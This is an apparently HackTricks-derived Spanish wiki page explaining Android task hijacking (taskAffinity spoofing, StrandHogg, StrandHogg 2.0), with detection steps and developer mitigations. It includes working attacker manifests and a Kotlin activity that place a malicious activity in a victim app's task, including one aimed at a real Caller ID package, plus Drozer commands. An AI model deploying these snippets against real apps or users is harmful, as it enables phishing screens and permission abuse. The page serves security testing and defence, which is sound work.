# Android Task Hijacking

{{#include ../../banners/hacktricks-training.md}}

## Tareas, Pila de Actividades y Actividades en Primer Plano

En Android, una **tarea** es esencialmente un conjunto de actividades con las que los usuarios interactúan para completar un trabajo específico, organizadas dentro de una **pila de actividades**. Esta pila ordena las actividades según cuándo fueron abiertas, con la actividad más reciente mostrada en la parte superior como la **actividad en primer plano**. En cualquier momento, solo esta actividad es visible en la pantalla, convirtiéndola en parte de la **tarea en primer plano**.

Aquí hay un desglose rápido de las transiciones de actividades:

- **Actividad 1** comienza como la única actividad en primer plano.
- Lanzar **Actividad 2** empuja **Actividad 1** a la pila de atrás, llevando **Actividad 2** al primer plano.
- Iniciar **Actividad 3** mueve **Actividad 1** y **Actividad 2** más atrás en la pila, con **Actividad 3** ahora al frente.
- Cerrar **Actividad 3** trae **Actividad 2** de vuelta al primer plano, mostrando el mecanismo de navegación de tareas optimizado de Android.

![https://developer.android.com/images/fundamentals/diagram_backstack.png](<../../images/image (698).png>)

---

## Ataques de afinidad de tareas

`taskAffinity` le dice a Android a qué tarea una `Actividad` *preferiría* pertenecer. Cuando dos actividades comparten la misma afinidad, **Android puede fusionarlas dentro de la misma pila de atrás incluso si provienen de diferentes APKs**.

Si un atacante puede colocar una actividad maliciosa en la **raíz** de esa pila, cada vez que la víctima abre la aplicación legítima, la interfaz de usuario maliciosa será lo primero que el usuario vea, lo que es perfecto para phishing o solicitudes de permisos abusivas.

La superficie de ataque es más amplia de lo que muchos desarrolladores piensan porque **cada actividad hereda automáticamente una afinidad igual al nombre del paquete de la aplicación** (a menos que el desarrollador establezca `android:taskAffinity=""`). Por lo tanto, *no hacer nada* ya deja la aplicación abierta a la suplantación de tareas en versiones de Android anteriores a 11.

### Escenario clásico "singleTask / StrandHogg"

1. El atacante declara una actividad con:
```xml
<activity android:name=".EvilActivity"
android:exported="true"
android:taskAffinity="com.victim.package"
android:launchMode="singleTask" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
2. La aplicación maliciosa se inicia una vez para que la tarea (con la afinidad falsificada) exista en tareas recientes.
3. Cuando el usuario abre más tarde la aplicación real, Android encuentra que ya hay una tarea cuya **afinidad raíz coincide con el paquete** y simplemente lleva esa tarea al primer plano.
4. La interfaz de usuario del atacante se muestra primero.

### Variante de Afinidad Predeterminada (sin `singleTask`) – Estudio de caso de Caller ID

La vulnerabilidad reportada en la aplicación **Caller ID (caller.id.phone.number.block)** muestra que el ataque *también* funciona contra el modo de lanzamiento `standard` predeterminado:

1. La aplicación del atacante crea una actividad raíz falsa y se oculta inmediatamente:
```kotlin
class HackActivity : AppCompatActivity() {
override fun onCreate(savedInstanceState: Bundle?) {
super.onCreate(savedInstanceState)
moveTaskToBack(true)   // mantener la tarea en recientes pero fuera de la vista
}
}
```
2. El manifiesto solo necesita copiar el paquete de la víctima en `taskAffinity`:
```xml
<activity android:name=".HackActivity"
android:exported="true"
android:taskAffinity="com.caller.id.phone.number.block" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
3. Tan pronto como el usuario instala y abre la aplicación maliciosa **una vez**, existe una tarea cuya afinidad es igual al paquete de la víctima (pero está en segundo plano).
4. Cuando se lanza la aplicación real de Caller ID, Android reutiliza esa tarea y lleva `HackActivity` al primer plano → ventana de phishing/abuso de permisos.

> NOTA: A partir de **Android 11 (API 30)**, el sistema *no* coloca dos paquetes que no son parte del mismo UID en la misma tarea por defecto, mitigando esta variante particular. Las versiones anteriores siguen siendo vulnerables.

---

### StrandHogg 2.0 (CVE-2020-0096) – Suplantación de tareas basada en reflexión

El boletín de seguridad de Google de mayo de 2020 corrigió una variante más avanzada denominada **StrandHogg 2.0**. La explotación **no depende en absoluto de `taskAffinity`**; en su lugar, utiliza *reflexión* para insertar dinámicamente la actividad del atacante en la parte superior de *cada* tarea en ejecución, eludiendo completamente la restricción de “UID compartido” introducida por Android 11.

Puntos clave:

* Una aplicación maliciosa sin permisos puede, una vez abierta, iterar sobre las tareas en ejecución y llamar a APIs ocultas para **re-parentar** su propia actividad en cualquier tarea.
* Debido a que la actividad se inserta después del tiempo de ejecución, ni `launchMode` ni el análisis estático del manifiesto pueden detectar el ataque de antemano.
* Corregido mediante la retro-portación de una verificación en **Android 8.0/8.1/9** (SPL de mayo de 2020). **Android 10 y versiones posteriores no se ven afectadas.**

La detección en dispositivos pre-corregidos se puede realizar con `adb shell dumpsys activity activities` y observando actividades sospechosas cuyo nombre de paquete difiere de la *afinidad* de la tarea.

La mitigación para dispositivos antiguos es la misma que la suplantación de tareas clásica **más** verificación en tiempo de ejecución (por ejemplo, llamando a [`ActivityManager#getRunningTasks`](https://developer.android.com/reference/android/app/ActivityManager#getRunningTasks(int)) y validando tu propio nombre de paquete).

---

## Lista de verificación de Detección y Explotación

1. **Revisión estática** – Extraer `AndroidManifest.xml` del APK objetivo y verificar que cada `<activity>` (o el elemento global `<application>`) contenga `android:taskAffinity=""` (vacío) **o** un valor personalizado. Herramientas como:
```bash
# Usando apkanalyzer (Android SDK)
apkanalyzer manifest print app.apk | grep -i taskaffinity

# Usando AXMLPrinter2
java -jar AXMLPrinter2.jar AndroidManifest.xml | grep taskAffinity
```
2. **Revisión dinámica** – En el dispositivo, abre la aplicación objetivo y lista las tareas:
```bash
adb shell dumpsys activity activities | grep -A3 "TASK" | grep -E "Root|affinity"
```
Una tarea cuya afinidad raíz es igual al paquete de la víctima pero cuya actividad superior pertenece a un *paquete diferente* es una señal de alerta.
3. Crea una aplicación maliciosa como se describe arriba, o usa **[Drozer](https://github.com/WithSecureLabs/drozer)**:
```bash
drozer console connect
run app.activity.start --component com.victim/.MainActivity --action android.intent.action.MAIN
run app.activity.info com.victim
```

---

## Mitigación

Los desarrolladores deben:

* Establecer explícitamente `android:taskAffinity=""` a nivel de `<application>` (recomendado) **o** dar a cada actividad una afinidad única y privada.
* Para pantallas altamente sensibles, combinar lo anterior con `android:launchMode="singleInstance"` o protecciones modernas de [`setLaunchMode`](https://developer.android.com/reference/android/content/pm/ActivityInfo#launchMode).
* Actualizar la `targetSdkVersion` de la aplicación y hacer cumplir los cambios de comportamiento de **Android 11** donde las tareas no se comparten entre paquetes por defecto.
* Apuntar a **Android 12 (API 31) o superior** para que el atributo obligatorio `android:exported` obligue a los desarrolladores a auditar cada componente accesible externamente.
* Considerar la autodefensa en tiempo de ejecución: consultar periódicamente `ActivityTaskManager` para asegurarse de que el paquete de tu actividad superior coincida con el tuyo.

---

## Técnicas relacionadas de Suplantación de UI

La suplantación de tareas a menudo se combina con o se reemplaza por **tapjacking** (engaño de UI basado en superposiciones). La investigación de **TapTrap** de 2025 mostró que actividades *impulsadas por animación* completamente transparentes pueden eludir las restricciones de toque de superposición introducidas en Android 12–14 y aún engañar a los usuarios para que otorguen permisos peligrosos. Aunque TapTrap no es estrictamente *suplantación* de tareas, el objetivo final (clics de phishing) es idéntico, por lo que las evaluaciones modernas deben verificar ambas superficies de ataque.

---

## Referencias

- [https://blog.dixitaditya.com/android-task-hijacking/](https://blog.dixitaditya.com/android-task-hijacking/)
- [https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html](https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html)
- [Android Manifest Misconfiguration Leading to Task Hijacking in Caller ID app](https://github.com/KMov-g/androidapps/blob/main/caller.id.phone.number.block.md)
- [https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06](https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06)
- [Promon – StrandHogg 2.0 (CVE-2020-0096) technical write-up](https://promon.io/resources/downloads/strandhogg-2-0-new-serious-android-vulnerability)
- [USENIX 2025 – TapTrap: Animation-Driven Tapjacking on Android](https://www.usenix.org/conference/usenixsecurity25/presentation/beer)

{{#include ../../banners/hacktricks-training.md}}
